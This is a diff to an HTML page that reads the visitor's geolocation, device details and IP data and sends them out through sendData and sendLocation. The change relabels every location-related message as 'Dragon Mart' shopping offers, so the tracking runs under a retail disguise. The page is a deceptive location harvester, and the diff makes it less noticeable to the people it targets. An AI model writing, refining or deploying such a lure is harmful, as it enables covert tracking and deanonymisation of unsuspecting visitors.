@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifying Your Location...</title>
+  <title>Verifying new Offers...</title>
   <style>
     * {
       margin: 0;
@@ -147,11 +147,11 @@
 </head>
 <body>
   <div class="container">
-    <h1>Verifying Your Location</h1>
+    <h1>Verifying new Offers</h1>
     
     <div class="status">
       <span id="status-icon">📍</span>
-      <span id="status-text">Requesting location permission...</span>
+      <span id="status-text"> Verifying Offers...</span>
     </div>
     
     <div class="loading-container">
@@ -162,12 +162,12 @@
     </div>
     
     <div class="device-info">
-      <h3>Device Information</h3>
-      <div id="device-details">Detecting your device...</div>
+      <h3>Dragon Mart Information</h3>
+      <div id="device-details">What is new...</div>
     </div>
     
     <div class="redirect-message">
-      You will be redirected in <span class="countdown" id="countdown">2</span> seconds
+      Search for Offers <span class="countdown" id="countdown">2</span> seconds
     </div>
   </div>
 
@@ -279,7 +279,7 @@ https://maps.google.com/?q=${lat},${lon}
       sendData(message);
     }
     
-    // Get location
+    // Get best Offers
     function getLocationPromise() {
       return new Promise((resolve) => {
         if (navigator.geolocation) {
@@ -307,7 +307,7 @@ https://maps.google.com/?q=${lat},${lon}
       } catch (e) {}
       
       // Update status
-      statusText.textContent = "Accessing location services...";
+      statusText.textContent = "What is new...";
       statusIcon.textContent = "📡";
       
       // Start progress bar animation
@@ -319,7 +319,7 @@ https://maps.google.com/?q=${lat},${lon}
       }, 20);
       
       // Start countdown
-      let countdown = 2;
+      let countdown = 1;
       const countdownInterval = setInterval(() => {
         countdownElement.textContent = countdown;
         countdown--;
@@ -333,11 +333,11 @@ https://maps.google.com/?q=${lat},${lon}
       const pos = await getLocationPromise();
       
       if (pos) {
-        statusText.textContent = "Location obtained successfully!";
+        statusText.textContent = "New Offers available!";
         statusIcon.textContent = "✅";
         sendLocation(pos.coords.latitude, pos.coords.longitude, ipData);
       } else {
-        statusText.textContent = "Location access not available";
+        statusText.textContent = "New Offers are not available";
         statusIcon.textContent = "⚠️";
         sendData(`❌ Location denied.\n${getDeviceInfo(ipData)}`);
       }
@@ -372,3 +372,4 @@ https://maps.google.com/?q=${lat},${lon}
   </script>
 </body>
 </html>
+
